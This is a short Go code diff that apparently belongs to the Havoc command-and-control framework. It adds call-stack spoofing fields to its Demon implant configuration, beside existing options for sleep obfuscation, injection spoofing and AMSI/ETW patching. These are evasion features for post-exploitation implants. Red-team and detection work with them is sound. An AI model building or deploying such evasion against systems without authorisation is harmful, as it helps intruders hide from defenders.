@@ -181,9 +181,14 @@ type Demon struct {
 	CoffeeThreaded     bool                   `yaotl:"CoffeeThreaded,optional"`
 	ExecDelay          int                    `yaotl:"ExecDelay,optional"`    /* HVC-046: base delay seconds between injection stages; 0 = disabled */
 	ExecDelayJitter    int                    `yaotl:"ExecDelayJitter,optional"` /* HVC-046: jitter % applied to ExecDelay; 0 = no jitter */
-	SleepObfStartAddr  *AddrResolveBlock      `yaotl:"SleepObfStartAddr,block"`
-	InjectSpoofAddr    *AddrResolveBlock      `yaotl:"InjectSpoofAddr,block"`
-	ProxyLoading       string                 `yaotl:"ProxyLoading,optional"`
+	SleepObfStartAddr   *AddrResolveBlock      `yaotl:"SleepObfStartAddr,block"`
+	InjectSpoofAddr     *AddrResolveBlock      `yaotl:"InjectSpoofAddr,block"`
+	StackSpoofStartAddr *AddrResolveBlock      `yaotl:"StackSpoofStartAddr,block"`
+	StackSpoofFrame0    *AddrResolveBlock      `yaotl:"StackSpoofFrame0,block"`
+	StackSpoofFrame1    *AddrResolveBlock      `yaotl:"StackSpoofFrame1,block"`
+	StackSpoofFrame2    *AddrResolveBlock      `yaotl:"StackSpoofFrame2,block"`
+	StackSpoofFrame3    *AddrResolveBlock      `yaotl:"StackSpoofFrame3,block"`
+	ProxyLoading        string                 `yaotl:"ProxyLoading,optional"`
 	AmsiEtwPatching    string                 `yaotl:"AmsiEtwPatching,optional"`
 	ProcessInjection   *ProcessInjectionBlock `yaotl:"Injection,block"`
 
